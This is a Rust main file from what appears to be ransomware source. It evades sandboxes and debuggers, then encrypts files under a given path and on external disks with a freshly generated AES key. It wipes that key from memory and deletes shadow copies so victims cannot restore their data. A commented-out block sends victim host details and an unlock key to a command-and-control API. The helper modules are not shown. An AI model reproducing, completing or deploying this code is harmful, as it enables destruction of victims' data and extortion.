mod c2;
mod encryption;
mod system;
use serde_json::json;
use serde_json::Value;
use std::{env, process::exit};

#[tokio::main]
async fn main() {
    /* let c2 = c2::api::C2API::new();
    let body = json!({
        "versionOS": "Windows 10",
        "hosts": "WIN10254",
        "hookUser": "peter",
        "unlockKey": "Some_random_key"
    });
    let api_res = c2.post(&body, "api/data").await;

    match api_res {
        Ok(res) => {
            let json_response: Value = res.json().await.unwrap();
            println!("{}", json_response)
        }
        Err(error) => {
            if error.is_status() {
                println!("{}", error.status().unwrap())
            }
        }
    } */

    let args: Vec<String> = env::args().collect();
    if args.len() < 2 {
        println!("Missing Arguments");
        exit(-1)
    }

    if !system::sandbox::is_debugger_detected() && !system::sandbox::is_sandbox_detected() {
        let mut key = encryption::file::gen_aes_key(32);

        encryption::file::multi_threaded_encrypt_decrypt_files(&args[1][..], key.as_bytes());
        encryption::disk::encrypt_decrypt_external_disks(key.as_bytes());

        unsafe {
            for key_char in key.as_mut_vec() {
                *key_char = 48;
            }
        }
        //println!("{}", key);

        system::file::delete_shadow_copies();
    }

    exit(0);
}
